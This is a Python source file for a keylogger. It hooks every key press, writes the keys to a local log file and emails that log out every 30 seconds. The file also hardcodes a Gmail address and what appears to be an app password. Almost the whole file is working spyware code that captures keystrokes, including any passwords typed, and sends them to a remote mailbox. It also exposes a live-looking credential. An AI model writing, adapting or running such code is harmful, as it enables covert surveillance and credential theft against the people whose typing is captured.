# version 1.1
import keyboard
import datetime
from sendfile import SendMail
import threading


class Logger:

    filePath = ""

    def __init__(self, path, mail):
        self.mailer = mail
        self.filePath = path

    def logKeys(self, key):
        with open(self.filePath, "a") as file:
            file.write(key)

    def getKeys(self, event):

        keymap = {
            "escape": " [escape] ",
            "enter": " [enter]\n",
            "tab": " [tab] ",
            "backspace": " [bkspace] ",
            "space": " [space] ",
            "shift": " [shift] ",
            "ctrl": " [ctrl] ",
            "alt": " [alt] ",
            "up": " [up] ",
            "down": " [down] ",
            "left": " [left] ",
            "right": " [right] ",
            "caps lock": " [caps lock] ",
            "left windows": " [left windows] ",
        }

        value = keymap.get(event.name, event.name)
        self.logKeys(value)

    def send_periodically(self):
        mailer.send_email_with_attachment()
        # Schedule again after 30 seconds
        t = threading.Timer(30, self.send_periodically)
        t.daemon = True
        t.start()

    def run(self):

        self.send_periodically()  # Start the first timer
        keyboard.on_press(callback=self.getKeys)
        keyboard.wait()

    # def run(self):
    #     thread = threading.Timer(30, self.mailer.send_email_with_attachment)
    #     thread.start()
    #     keyboard.on_press(callback=self.getKeys)
    #     keyboard.wait()


if __name__ == "__main__":

    print("[+] started....")

    start = f"\nStarted at [{datetime.datetime.now()}]\n"
    sender_email = "sameertrivedi.28170@gmail.com"
    sender_password = "cnzh vhad kczd wetn"
    receiver_email = "sameertrivedi.28170@gmail.com"

    try:
        mailer = SendMail(sender_email, sender_password, receiver_email, "capture.log")
        log = Logger("capture.log", mailer)
        log.logKeys(start)
        log.run()

    except Exception as e:
        print(e)

    except KeyboardInterrupt:
        print("[!] Quitting....")
